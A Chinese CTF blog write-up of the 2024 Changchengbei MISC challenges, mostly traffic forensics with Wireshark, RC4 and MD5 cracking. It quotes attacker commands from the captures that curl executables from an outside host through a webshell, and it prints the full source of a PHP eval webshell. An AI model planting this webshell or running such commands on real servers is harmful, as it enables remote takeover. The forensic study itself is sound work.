@@ -1,0 +1,279 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>长城杯 2024 MISC Writeup | w8nn9z's Blog</title><meta name="author" content="w8nn9z"><meta name="copyright" content="w8nn9z"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="长城杯 2024 MISC WriteupBrickGame 题目内容： 通关小游戏即可获得flag。  通关小游戏即可，一共三个关卡：   漏洞探踪，流量解密 题目内容： 网站遭遇异常攻击，通过日志与流量锁定攻击来源，阶段二的压缩包密码是攻击来源ip地址，比如127.0.0.1，对捕获的数据包进行解密，识别加密算法并还原flag。flag格式为flag:{xxxxx}  附件给了第一阶段和第二阶">
+<meta property="og:type" content="article">
+<meta property="og:title" content="长城杯 2024 MISC Writeup">
+<meta property="og:url" content="http://example.com/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%202024%20MISC%20Writeup/index.html">
+<meta property="og:site_name" content="w8nn9z&#39;s Blog">
+<meta property="og:description" content="长城杯 2024 MISC WriteupBrickGame 题目内容： 通关小游戏即可获得flag。  通关小游戏即可，一共三个关卡：   漏洞探踪，流量解密 题目内容： 网站遭遇异常攻击，通过日志与流量锁定攻击来源，阶段二的压缩包密码是攻击来源ip地址，比如127.0.0.1，对捕获的数据包进行解密，识别加密算法并还原flag。flag格式为flag:{xxxxx}  附件给了第一阶段和第二阶">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024/cover.png">
+<meta property="article:published_time" content="2024-09-08T10:23:47.000Z">
+<meta property="article:modified_time" content="2024-11-16T06:45:02.071Z">
+<meta property="article:author" content="w8nn9z">
+<meta property="article:tag" content="MISC">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024/cover.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%202024%20MISC%20Writeup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
+      const saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+      
+      window.btf = {
+        saveToLocal: saveToLocal,
+        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+          script.src = url
+          script.async = true
+          script.onerror = reject
+          script.onload = script.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            script.onload = script.onreadystatechange = null
+            resolve()
+          }
+
+          Object.keys(attr).forEach(key => {
+            script.setAttribute(key, attr[key])
+          })
+
+          document.head.appendChild(script)
+        }),
+
+        getCSS: (url, id = false) => new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+          link.rel = 'stylesheet'
+          link.href = url
+          if (id) link.id = id
+          link.onerror = reject
+          link.onload = link.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            link.onload = link.onreadystatechange = null
+            resolve()
+          }
+          document.head.appendChild(link)
+        }),
+
+        addGlobalFn: (key, fn, name = false, parent = window) => {
+          const pjaxEnable = false
+          if (!pjaxEnable && key.startsWith('pjax')) return
+
+          const globalFn = parent.globalFn || {}
+          const keyObj = globalFn[key] || {}
+    
+          if (name && keyObj[name]) return
+    
+          name = name || Object.keys(keyObj).length
+          keyObj[name] = fn
+          globalFn[key] = keyObj
+          parent.globalFn = globalFn
+        }
+      }
+    
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+      
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })()</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '长城杯 2024 MISC Writeup',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-16 14:45:02'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024/cover.png')"><nav id="nav"><span id="blog-info"><a href="/" title="w8nn9z's Blog"><span class="site-name">w8nn9z's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">长城杯 2024 MISC Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-09-08T10:23:47.000Z" title="Created 2024-09-08 18:23:47">2024-09-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-11-16T06:45:02.071Z" title="Updated 2024-11-16 14:45:02">2024-11-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="长城杯 2024 MISC Writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="长城杯-2024-MISC-Writeup"><a href="#长城杯-2024-MISC-Writeup" class="headerlink" title="长城杯 2024 MISC Writeup"></a>长城杯 2024 MISC Writeup</h1><h2 id="BrickGame"><a href="#BrickGame" class="headerlink" title="BrickGame"></a>BrickGame</h2><blockquote>
+<p>题目内容：</p>
+<p>通关小游戏即可获得flag。</p>
+</blockquote>
+<p>通关小游戏即可，一共三个关卡：</p>
+<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024/1.png"></p>
+<hr>
+<h2 id="漏洞探踪，流量解密"><a href="#漏洞探踪，流量解密" class="headerlink" title="漏洞探踪，流量解密"></a>漏洞探踪，流量解密</h2><blockquote>
+<p>题目内容：</p>
+<p>网站遭遇异常攻击，通过日志与流量锁定攻击来源，阶段二的压缩包密码是攻击来源ip地址，比如127.0.0.1，对捕获的数据包进行解密，识别加密算法并还原flag。flag格式为flag:{xxxxx}</p>
+</blockquote>
+<p>附件给了第一阶段和第二阶段两个文件夹，根据题目内容可知要先从第一阶段获取攻击ip地址</p>
+<p>第一阶段的文件夹中给了一个日志文件 <code>oa.access.log</code> 和一个流量文件 <code>第一阶段.cap</code></p>
+<p>先看看流量，流量里相当一部分http响应状态码都是404，并且如果翻看http导出对象的话，可以发现明显是在进行敏感目录扫描，并且大小基本都是564bytes：</p>
+<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024/2.png"></p>
+<p>找大小明显不同的，发现 <code>gateway.php</code> 明显很大，还有敏感目录 <code>upload.php</code> ：</p>
+<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024/3.png"></p>
+<p>并且这些http响应全是OK，可以试着过滤出http响应是OK的流量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.response.phrase == &quot;OK&quot;</span><br></pre></td></tr></table></figure>
+
+<p>仔细看看 <code>upload.php</code> 的文件流量，能看到上传了一个jpg图片马：</p>
+<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024/4.png"></p>
+<p>在网上找找这个敏感目录，可以找到一个<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/13607055.html">通达OA 任意文件上传+文件包含</a>导致RCE的洞，之后在日志文件里找找就能发现有几个ip都访问这个目录的记录，一个一个试过来，最后发现攻击ip是<em>192.168.30.234</em>：</p>
+<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024/5.png"></p>
+<p>拿攻击ip解第二阶段的压缩包，解出来一个新的流量文件 <code>二阶段汇总.cap</code>，一样先看看明显不同的http对象：</p>
+<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024/6.png"></p>
+<p>一个key，一个raw，再看看 <code>gateway.php</code> 进行的操作可以发现有两条比较重要的，还有一条提示了加密方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcp.stream eq 91</span><br><span class="line">&amp;f=curl+-o+%25TEMP%25%5Ckey.exe+http%3A%2F%2F192.168.1.5%2Fkey </span><br><span class="line">url解码后结果：</span><br><span class="line">&amp;f=curl -o %TEMP%\key.exe http://192.168.1.5/key </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcp.stream eq 95</span><br><span class="line">Encryption is R, C, 4. Good luck </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcp.stream eq 220</span><br><span class="line">&amp;f=curl+-o+%25TEMP%25%5Ckey.exe+http%3A%2F%2F192.168.1.5%2Fraw</span><br><span class="line">url解码后结果：</span><br><span class="line">&amp;f=curl -o %TEMP%\key.exe http://192.168.1.5/raw</span><br></pre></td></tr></table></figure>
+
+<p>注意raw开头重复了key，删掉再RC4解就行了：</p>
+<p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024/7.png"></p>
+<hr>
+<h2 id="最安全的加密方式"><a href="#最安全的加密方式" class="headerlink" title="最安全的加密方式"></a>最安全的加密方式</h2><blockquote>
+<p>题目内容：</p>
+<p>找到了一个最安全的加密方式，然后将自己的密码用这种方式加密起来，你能破解出来吗？</p>
+</blockquote>
+<p>流量里上传了加密脚本以及 <code>flag.rar</code> ，先全部提出来：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;25ming@&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用25ming@解rar，拿到 <code>flag.txt</code> ，结合加密脚本可以知道里面都是md5值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">8fa14cdd754f91cc6554c9e71929cce7</span><br><span class="line">2db95e8e1a9267b7a1188556b2013b33</span><br><span class="line">0cc175b9c0f1b6a831c399e269772661</span><br><span class="line">b2f5ff47436671b6e533d8dc3614845d</span><br><span class="line">f95b70fdc3088560732a5ac135644506</span><br><span class="line">b9ece18c950afbfa6b0fdbfa4ff731d3</span><br><span class="line">2510c39011c5be704182423e3a695e91</span><br><span class="line">e1671797c52e15f763380b45e841ec32</span><br><span class="line">b14a7b8059d9c055954c92674ce60032</span><br><span class="line">6f8f57715090da2632453988d9a1501b</span><br><span class="line">cfcd208495d565ef66e7dff9f98764da</span><br><span class="line">03c7c0ace395d80182db07ae2c30f034</span><br><span class="line">e358efa489f58062f10dd7316b65649e</span><br><span class="line">b14a7b8059d9c055954c92674ce60032</span><br><span class="line">c81e728d9d4c2f636f067f89cc14862c</span><br><span class="line">e1671797c52e15f763380b45e841ec32</span><br><span class="line">4a8a08f09d37b73795649038408b5f33</span><br><span class="line">4c614360da93c0a041b22e537de151eb</span><br><span class="line">4b43b0aee35624cd95b910189b3dc231</span><br><span class="line">e1671797c52e15f763380b45e841ec32</span><br><span class="line">b14a7b8059d9c055954c92674ce60032</span><br><span class="line">e1671797c52e15f763380b45e841ec32</span><br><span class="line">8d9c307cb7f3c4a32822a51922d1ceaa</span><br><span class="line">4a8a08f09d37b73795649038408b5f33</span><br><span class="line">4b43b0aee35624cd95b910189b3dc231</span><br><span class="line">57cec4137b614c87cb4e24a3d003a3e0</span><br><span class="line">83878c91171338902e0fe0fb97a8c47a</span><br><span class="line">e358efa489f58062f10dd7316b65649e</span><br><span class="line">865c0c0b4ab0e063e5caa3387c1a8741</span><br><span class="line">d95679752134a2d9eb61dbd7b91c4bcc</span><br><span class="line">7b8b965ad4bca0e41ab51de7b31363a1</span><br><span class="line">9033e0e305f247c0c3c80d0c7848c8b3</span><br><span class="line">9033e0e305f247c0c3c80d0c7848c8b3</span><br><span class="line">9033e0e305f247c0c3c80d0c7848c8b3</span><br><span class="line">cbb184dd8e05c9709e5dcaedaa0495cf</span><br></pre></td></tr></table></figure>
+
+<p>本来还在想怎么搞md5里的pass和key，后来在线网站找了几个前面的md5，发现是分别对应 <code>f l a g</code> 的md5值，直接爆破：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">s = string.ascii_letters + <span class="string">&quot;0123456789&quot;</span> + <span class="string">&quot;_&#123;@&#125;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> line.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>) == hashlib.md5(j.encode()).hexdigest():</span><br><span class="line">                flag += j</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;The_m0st_2ecUre_eNcrYption&#125;</span></span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">w8nn9z</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%202024%20MISC%20Writeup/">http://example.com/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%202024%20MISC%20Writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/MISC/">MISC</a><a class="post-meta__tags" href="/tags/writeup/">writeup</a></div><div class="post_share"><div class="social-share" data-image="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024/cover.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/09/11/WMCTF%202024%20Forensics%20%E5%A4%8D%E7%8E%B0/" title="WMCTF 2024 Forensics 复现"><img class="cover" src="/images/WMCTF_2024/cover.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">WMCTF 2024 Forensics 复现</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/26/NepCTF%202024%20MISC%20Writeup/" title="NepCTF 2024 MISC Writeup"><img class="cover" src="/images/NepCTF_2024/cover.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">NepCTF 2024 MISC Writeup</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2024/03/01/HGAME%202024%20MISC%20Writeup/" title="HGAME 2024 MISC Writeup"><img class="cover" src="/images/HGAME_2024/HGAME2024.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-01</div><div class="title">HGAME 2024 MISC Writeup</div></div></a></div><div><a href="/2024/08/26/NepCTF%202024%20MISC%20Writeup/" title="NepCTF 2024 MISC Writeup"><img class="cover" src="/images/NepCTF_2024/cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-26</div><div class="title">NepCTF 2024 MISC Writeup</div></div></a></div><div><a href="/2024/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%202024%20MISC%20Writeup/" title="巅峰极客 2024 MISC Writeup"><img class="cover" src="/images/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-21</div><div class="title">巅峰极客 2024 MISC Writeup</div></div></a></div><div><a href="/2024/08/10/MoeCTF%202024%20Writeup/" title="MoeCTF 2024 Writeup"><img class="cover" src="/images/MoeCTF_2024/MoeCTF_2024.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-10</div><div class="title">MoeCTF 2024 Writeup</div></div></a></div><div><a href="/2024/07/21/DASCTF%202024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B%20MISC%20Writeup/" title="DASCTF 2024暑期挑战赛 MISC Writeup"><img class="cover" src="/images/DASCTF_2024_summer/cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-21</div><div class="title">DASCTF 2024暑期挑战赛 MISC Writeup</div></div></a></div><div><a href="/2024/09/11/WMCTF%202024%20Forensics%20%E5%A4%8D%E7%8E%B0/" title="WMCTF 2024 Forensics 复现"><img class="cover" src="/images/WMCTF_2024/cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-11</div><div class="title">WMCTF 2024 Forensics 复现</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">w8nn9z</div><div class="author-info__description">__0rrrrzz__</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%95%BF%E5%9F%8E%E6%9D%AF-2024-MISC-Writeup"><span class="toc-number">1.</span> <span class="toc-text">长城杯 2024 MISC Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BrickGame"><span class="toc-number">1.1.</span> <span class="toc-text">BrickGame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E8%B8%AA%EF%BC%8C%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞探踪，流量解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%AE%89%E5%85%A8%E7%9A%84%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.</span> <span class="toc-text">最安全的加密方式</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" 